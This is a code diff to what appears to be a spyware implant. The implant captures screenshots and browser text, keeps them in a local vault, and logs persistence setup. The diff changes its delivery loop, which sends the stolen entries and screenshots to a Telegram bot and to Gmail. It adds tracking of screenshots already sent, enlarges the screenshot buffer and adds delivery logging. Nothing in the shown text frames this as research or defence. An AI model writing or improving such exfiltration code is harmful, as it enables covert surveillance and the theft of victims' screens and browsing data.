@@ -78,8 +78,9 @@ except Exception as e:
     _log(f"PERSISTENCE ERROR: {e}")
 
 # ── SCREENSHOT BUFFER (last N kept for delivery) ─────────────────────────────
-_recent_screenshots = []   # list of (filename, png_bytes) — last 5 kept in memory
-_MAX_SS_MEMORY = 5
+_recent_screenshots = []   # list of (filename, png_bytes)
+_sent_screenshots   = set() # filenames already sent — avoid resending
+_MAX_SS_MEMORY = 20
 
 # ── CALLBACKS ─────────────────────────────────────────────────────────────────
 
@@ -93,6 +94,7 @@ def on_screenshot(png_bytes: bytes):
     _recent_screenshots.append((fname, png_bytes))
     if len(_recent_screenshots) > _MAX_SS_MEMORY:
         _recent_screenshots.pop(0)
+    _log(f"screenshot captured: {fname}")
 
 def on_browser(text: str):
     vault_write(vault_dir, key, "browser", text)
@@ -141,14 +143,32 @@ def delivery_loop():
     time.sleep(120)
     while True:
         try:
-            # Pull entries from last interval period
-            since   = datetime.utcnow() - timedelta(seconds=config.DELIVERY_INTERVAL_SECONDS + 60)
+            _log("delivery triggered")
+
+            # All vault entries from last interval
+            since   = datetime.utcnow() - timedelta(seconds=config.DELIVERY_INTERVAL_SECONDS + 120)
             entries = vault_read_all(vault_dir, key)
-            # Filter to recent entries only
             recent  = [e for e in entries
                        if datetime.fromisoformat(e["ts"]) >= since]
+            _log(f"entries to send: {len(recent)}")
 
-            screenshots = list(_recent_screenshots)   # snapshot
+            # Only send screenshots not yet sent
+            unsent = [(f, b) for f, b in _recent_screenshots
+                      if f not in _sent_screenshots]
+            to_send = unsent[-5:]  # max 5 per report
+            for fname, _ in to_send:
+                _sent_screenshots.add(fname)
+            _log(f"screenshots to send: {len(to_send)}")
+
+            # Telegram
+            if config.ENABLE_TELEGRAM:
+                telegram_delivery.send_report(
+                    token       = config.TELEGRAM_BOT_TOKEN,
+                    chat_id     = config.TELEGRAM_CHAT_ID,
+                    entries     = recent,
+                    screenshots = to_send if to_send else None
+                )
+                _log("telegram sent")
 
             # Gmail
             if config.ENABLE_EMAIL:
@@ -159,16 +179,7 @@ def delivery_loop():
                     email_to       = config.EMAIL_TO,
                     subject_prefix = config.EMAIL_SUBJECT_PREFIX,
                     text_body      = body,
-                    screenshots    = screenshots[-3:] if screenshots else None
-                )
-
-            # Telegram
-            if config.ENABLE_TELEGRAM:
-                telegram_delivery.send_report(
-                    token       = config.TELEGRAM_BOT_TOKEN,
-                    chat_id     = config.TELEGRAM_CHAT_ID,
-                    entries     = recent,
-                    screenshots = screenshots[-3:] if screenshots else None
+                    screenshots    = to_send[-3:] if to_send else None
                 )
 
         except Exception as e:
